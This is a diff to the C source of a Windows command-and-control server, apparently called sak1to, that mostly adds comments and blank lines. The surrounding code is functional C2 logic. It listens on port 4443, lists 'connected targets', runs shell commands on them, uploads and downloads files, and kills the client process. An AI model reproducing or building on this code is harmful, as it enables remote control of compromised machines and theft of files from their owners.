@@ -69,6 +69,7 @@ const SOCKET create_socket() {
 	if (listen_socket == INVALID_SOCKET) {
 		fprintf(stderr, "Socket creation failed: %ld\n", WSAGetLastError());
 		WSACleanup();
+	
 		exit(1);
 	}
 
@@ -109,7 +110,6 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 	bind_socket(conns->listen_socket, 4443);
 
 	while (1) {
-		// Wait for a connection.
 		struct sockaddr_in client;
 		int c_size = sizeof(client);
 
@@ -118,7 +118,7 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 		if (client_socket == INVALID_SOCKET)
 			terminate_server(conns->listen_socket, "Error accepting client connection");
 
-		// Client's remote name and client's ingress port.
+		// Client's remote name and port.
 		char host[NI_MAXHOST] = { 0 };
 		char service[NI_MAXHOST] = { 0 };
 
@@ -154,6 +154,7 @@ void list_connections(const Conn_map* conns) {
 	printf("---  C0NNECTED TARGETS  ---\n");
 	printf("--     Hostname: ID      --\n");
 	printf("---------------------------\n\n");
+
 	if (conns->size) {
 		for (size_t i = 0; i < conns->size; i++) {
 			printf("%s: %lu\n", conns->clients[i].host, i);
@@ -167,8 +168,10 @@ void list_connections(const Conn_map* conns) {
 
 // Function to upload file to target machine (TCP file transfer).
 int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
-	// Send command to the client to be parsed.
+	// '3' is the command code for uploading a file via the client.
 	buf[7] = '3';
+
+	// Send command code + filename to be parsed.
 	if (send(client_socket, &buf[7], cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
@@ -176,6 +179,7 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	FILE* fd = fopen(&buf[8], "rb");
 	uint32_t bytes = 0, f_size = 0;
 
+	// If the file exists:
 	if (fd) {
 		// Get file size.
 		fseek(fd, 0L, SEEK_END);
@@ -189,6 +193,7 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	if (send(client_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
 		return SOCKET_ERROR;
 
+	// Initialize i_result to true.
 	int i_result = 1;
 
 	if (f_size) {
@@ -212,18 +217,23 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 
 // Function to receive file from target machine (TCP file transfer).
 int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
-	// Send command to the client to be parsed.
+	// '4' is the command code for downloading a file via the client.
 	buf[9] = '4';
+
+	// Send command code + filename to be parsed.
 	if (send(client_socket, &buf[9], cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
 	FILE* fd = fopen(&buf[10], "wb");
 
-	// Receive file size.
+	// Receive file size serialized uint32_t bytes.
 	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
 		return SOCKET_ERROR;
 
+	// Deserialize file size bytes.
 	uint32_t f_size = ntohl_conv(&*(buf));
+	
+	// Initialize i_result to true.
 	int i_result = 1;
 
 	// Varaible to keep track of downloaded data.
@@ -236,6 +246,7 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 		total += i_result;
 	}
 
+	// Close the file.
 	fclose(fd);
 
 	return i_result;
@@ -243,7 +254,10 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 
 // Function send change directory command to client.
 int client_cd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+	// '1' is the command code for changing directory via the client.
 	buf[3] = '1';
+	
+	// Send command code + directory to be parsed.
 	if (send(client_socket, &buf[3], cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
@@ -252,6 +266,7 @@ int client_cd(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 
 // Function to terminate/kill client.
 int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+	// '2' is the command code for terminating/killing the process on the client.
 	send(client_socket, "2", cmd_len, 0);
 
 	return 0;
@@ -264,12 +279,16 @@ int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 	if (send(client_socket, buf, cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
+	// Receive output stream size serialized uint32_t bytes.
 	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
 		return SOCKET_ERROR;
 
+	// Deserialize stream size bytes.
 	uint32_t s_size = ntohl_conv(&*(buf));
 
+	// Initialize i_result to true.
 	int i_result = 1;
+
 	// Receive command output stream and write output chunks to stdout.
 	do {
 		if ((i_result = recv(client_socket, buf, BUFLEN, 0)) < 1)
@@ -277,6 +296,7 @@ int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 		fwrite(buf, 1, i_result, stdout);
 	} while ((s_size -= i_result) > 0);
 
+	// Write single newline character to stdout for cmd line alignment.
 	fputc('\n', stdout);
 
 	return i_result;
@@ -286,6 +306,7 @@ int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 const func parse_cmd(char* const buf) {
 	// Array of command strings to parse stdin with.
 	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };
+
 	// Function pointer array of each c2 command.
 	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
 
@@ -327,11 +348,13 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 	const SOCKET client_socket = conns->clients[client_id].sock;
 	char* client_host = conns->clients[client_id].host;
 
+	// Initialize i_result to true.
 	int i_result = 1;
 
 	// Receive and parse input/send commands to client.
 	while (i_result > 0) {
 		printf("%s // ", client_host);
+	
 		// Set all bytes in buffer to zero.
 		memset(buf, '\0', BUFLEN);
 
@@ -372,6 +395,7 @@ void exec_cmd(char* const buf) {
 		fwrite(buf, 1, rb, stdout);
 	} while (rb == BUFLEN);
 
+	// Write single newline character to stdout for cmd line alignment.
 	fputc('\n', stdout);
 
 	// Close the pipe.
@@ -392,6 +416,7 @@ int main(void) {
 
 	while (1) {
 		printf("sak1to-console // ");
+	
 		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
 		char buf[BUFLEN + 1] = { 0 };
 
